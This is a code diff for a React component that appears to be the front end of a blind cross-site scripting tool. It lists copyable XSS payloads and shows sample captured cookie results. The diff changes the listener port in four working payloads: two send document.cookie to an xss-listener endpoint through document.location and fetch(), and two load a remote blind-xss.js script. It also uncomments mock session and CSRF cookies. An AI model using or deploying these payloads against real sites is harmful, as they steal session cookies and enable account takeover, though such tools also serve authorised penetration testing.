@@ -4,25 +4,25 @@ import styles from "./BlindXssResults.module.css";
 
 const BlindXssResults = () => {
   const [results, setResults] = useState([
-    // {
-    //   timestamp: "2024-06-12T12:34:56Z",
-    //   ip: "192.168.0.1",
-    //   cookie: "sessionid=abc123; csrftoken=xyz789",
-    // },
-    // {
-    //   timestamp: "2024-06-12T13:45:23Z",
-    //   ip: "192.168.0.2",
-    //   cookie: "sessionid=def456; csrftoken=uvw123",
-    // },
+    {
+      timestamp: "2024-06-12T12:34:56Z",
+      ip: "192.168.0.1",
+      cookie: "sessionid=abc123; csrftoken=xyz789",
+    },
+    {
+      timestamp: "2024-06-12T13:45:23Z",
+      ip: "192.168.0.2",
+      cookie: "sessionid=def456; csrftoken=uvw123",
+    },
   ]);
 
   const [payloadCopied, setPayloadCopied] = useState(false);
 
   const payloads = [
-    "<script src='http://localhost:3000/blind-xss.js'></script>",
-    "<img src=x onerror='document.location=`http://localhost:3000/xss-listener?cookie=${document.cookie}`'>",
-    "<iframe src='http://localhost:3000/blind-xss.js'></iframe>",
-    "<svg/onload=fetch('http://localhost:3000/xss-listener?cookie='+document.cookie)>",
+    "<script src='http://localhost:8000/blind-xss.js'></script>",
+    "<img src=x onerror='document.location=`http://localhost:8000/xss-listener?cookie=${document.cookie}`'>",
+    "<iframe src='http://localhost:8000/blind-xss.js'></iframe>",
+    "<svg/onload=fetch('http://localhost:8000/xss-listener?cookie='+document.cookie)>",
   ];
 
   const copyToClipboard = (payload) => {
